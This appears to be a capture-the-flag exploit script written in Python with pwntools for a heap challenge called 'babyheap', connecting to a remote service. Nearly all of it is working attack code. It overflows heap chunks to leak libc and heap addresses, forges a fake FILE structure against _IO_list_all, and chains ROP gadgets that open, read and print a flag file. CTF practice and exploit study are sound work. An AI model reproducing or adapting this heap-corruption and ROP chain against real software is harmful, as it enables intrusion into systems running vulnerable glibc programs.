from pwn import *
import sys 

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./babyheap")#,env = {"LD_PRELOAD":"./libc-2.23.so"})
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	p = remote("123.206.174.203","20001")
	libc = ELF("./libc-2.23.so")

def menu(choice):
	p.sendlineafter("Choice: \n",str(choice))

def add(size):
	menu(1)
	p.sendafter("Size: ",str(size))

def edit(index,content):
	menu(2)
	p.sendafter("Index: ",str(index))
	p.sendafter("Content: ",content)

def free(index):
	menu(3)
	p.sendafter("Index: ",str(index))

def show(index):
	menu(4)
	p.sendafter("Index: ",str(index))

def rop(p1,p2,p3,call_table):
	rdi = 0x000000000003ba59
	rsi = 0x00000000001408b2
	rdx = 0x0000000000001b92
	rax = 0x0000000000033544
	syscall_ret = 0x00000000000fdb27
	ret = 0x0000000000000937
	payload = ""
	payload += p64(libc.address + rdi) + p64(p1)
	payload += p64(libc.address + rsi) + p64(p2)
	payload += p64(libc.address + rdx) + p64(p3)
	payload += p64(libc.address + rax) + p64(call_table)
	payload += p64(libc.address + syscall_ret) + p64(libc.address + ret)
	return payload

def rop2(p1,p2,p3,target):
	#0x00000000000a590a : push qword ptr [rax] ; leave ; mov byte ptr [rax], cl ; mov rax, rdi ; ret
	rdi = 0x000000000003ba59
	rsi = 0x00000000001408b2
	rdx = 0x0000000000001b92
	rax = 0x0000000000033544
	syscall_ret = 0x00000000000fdb27
	ret = 0x0000000000000937
	rcx = 0x00000000001419e3
	mov_ = 0x00000000000a590a
	payload = ""
	payload += p64(libc.address + rdi) + p64(p1)
	payload += p64(libc.address + rsi) + p64(p2)
	payload += p64(libc.address + rdx) + p64(p3)
	payload += p64(target)
	return payload

code_base = 0x555555554000
def debugf():
	if debug:
		#gdb.attach(p,"b *{b1}\nb __libc_message\nb _IO_flush_all_lockp".format(b1 = hex(code_base + 0xC2B)))
		gdb.attach(p,"b _IO_flush_all_lockp")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
size = 0x200 - 8
add(size) #0
add(size) #1
add(size) #2
add(size) #3
add(0x20) #4
add(size) #5
add(size) #6
payload = "\x00" * (size - 8) + p64( (size + 8)*2)
free(0)
#debugf()
edit(1,payload)
free(2)
add(size)  #0
show(1)
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:" + hex(libc.address))
#debugf()
size2 = 0x200 - 0x10
add(size2 * 2 + 0x10) #2
free(5)
free(2)
show(1)
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
heap_base = leak_addr - 0x830
log.success("heap_base:" + hex(heap_base))
add(size2 * 2 + 0x10) #2
add(size2) #5
free(1)
add(0x10)
binsh = libc.search("/bin/sh").next()
system = libc.symbols["system"]
# 0x000000000006fb6c : pop rbx ; pop rbp ; pop r12 ; mov rax, qword ptr [rax + 0x48] ; jmp rax
# rax = index6 heap addr
payload = p64(0) * 2 + p64(libc.address + 0x000000000006fb6c) + p64(0x61) + p64(0) + p64(libc.symbols["_IO_list_all"] - 0x10)
payload += p64(0xff) + p64(binsh)*5
payload = payload.ljust(0xc0 + 0x10, "\x00")
payload += p64(-1 & 0xffffffffffffffff)
payload = payload.ljust(0xd8 + 0x10, "\x00")
_IO_str_jumps = libc.address + 0x3c37a0
# 0x0000000000194f15 : pop rbp ; sti ; jmp qword ptr [rax]
adjust_offset = 0x10
payload += p64(heap_base + 0xa30 + adjust_offset) + p64(system) + p64(libc.address + 0x0000000000194f15)
edit(2,payload)
# 0x00000000001bb58a push rax ; clc ; call qword ptr [rbx]
_IO_str_jumps = libc.address + 0x3c37a0
target = libc.address + 0x00000000001bb590
target2 = libc.address + 0x7cfa0
#target2 = libc.address + 0x7cfa0
# 0x00000000000398c1 : lea rsp, qword ptr [rbp - 0x10] ; pop rbx ; pop r12 ; pop rbp ; ret
pp_ret = libc.address + 0x000000000001f92f
p5_ret = libc.address + 0x00000000000cd6b1
payload = p64(0xdeadbeef) + p64(pp_ret) + p64(0xdeadbeef) + p64(target)
payload += p64(p5_ret) + "/flag\x00"
payload = payload.ljust(0x48 - adjust_offset + 0x10, "\x00")
payload += p64(libc.address + 0x00000000000398c1)
#payload += 
if debug:
	payload += rop(heap_base + 0xa30 + 0x38,0,0,2)
	payload += rop(4,heap_base + 0xa30 + 0x38,0x100,0)
	payload += rop(1,heap_base + 0xa30 + 0x38,0x100,1)
else:
	payload += rop(heap_base + 0xa30 + 0x38,0,0,2)
	payload += rop(3,heap_base + 0xa30 + 0x38,0x100,0)
	payload += rop(1,heap_base + 0xa30 + 0x38,0x100,1)
edit(6,payload)
debugf()
add(0x200)
print p.recvuntil("}")
